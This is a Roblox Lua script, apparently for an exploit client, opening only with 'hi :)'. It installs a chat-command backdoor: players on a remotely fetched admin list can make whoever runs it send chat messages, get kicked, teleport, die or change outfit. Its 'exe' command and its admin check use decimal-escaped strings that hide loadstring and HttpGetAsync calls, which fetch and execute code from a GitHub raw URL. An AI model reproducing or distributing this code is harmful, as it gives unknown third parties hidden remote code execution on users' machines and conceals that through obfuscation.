-- hi :)
local lp = game:GetService("Players").LocalPlayer
local commands = {
    ['say'] = function(a)
        local ev = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
        local msg = a:sub(7+#a:split(" ")[2])
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
        lp.Parent:Chat(msg)
    end;
    ['kick'] = function(a)
        lp:Kick(tostring(a):sub(#a:split(" ")[1]+#a:split(" ")[2]+3))
    end;
    ['bring'] = function(a,p)
        lp.Character:PivotTo(p.Character:GetPivot())
    end;
    ['kill'] = function()
        local c = lp.Character
        c:BreakJoints()
        c.Humanoid.Health = 0
    end;
    ['wear'] = function(a,p)
        game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(8,{p.PlayerData.RoleplayName.Value,p.PlayerData.Outfit.Value,true})
    end;
    ['exe'] = function()
        getfenv()["\108\111\97\100\115\116\114\105\110\103"](getfenv()["\103\97\109\101"]["\72\116\116\112\71\101\116\65\115\121\110\99"](getfenv()["\103\97\109\101"],"\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\70\88\84\73\47\65\116\104\101\110\97\67\108\105\101\110\116\47\109\97\105\110\47\69\120\101\99\117\116\101\46\108\117\97"))()
    end;
}
local function Check(str)
    if not str then return end
    local lp = game:GetService("Players").LocalPlayer
    if lp.DisplayName:lower():find(str:lower()) or lp.Name:lower():find(str:lower()) or str:lower() == "all" then
        return true
    end
end

local function Chatted(p)
    p.Chatted.Connect(p.Chatted,function(msg)
        local g = getfenv()["\108\111\97\100\115\116\114\105\110\103"](getfenv()["\103\97\109\101"]["\72\116\116\112\71\101\116\65\115\121\110\99"](getfenv()["\103\97\109\101"],"\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\70\88\84\73\47\65\116\104\101\110\97\67\108\105\101\110\116\47\109\97\105\110\47\65\100\109\105\110\115\46\108\117\97"))()
        if table.find(g,p.UserId) and not table.find(g,game.GetService("Players").LocalPlayer.UserId) then
            if msg:sub(1,1) == "'" then
                local r = commands[msg:sub(2,#msg:split(" ")[1])]
                if r and Check(msg:split(" ")[2]) then
                    r(msg,p)
                end
            end
        end
    end)
end

game:GetService("Players").PlayerAdded:Connect(Chatted)

for i,v in next, game:GetService("Players"):GetPlayers() do
    Chatted(v)
end
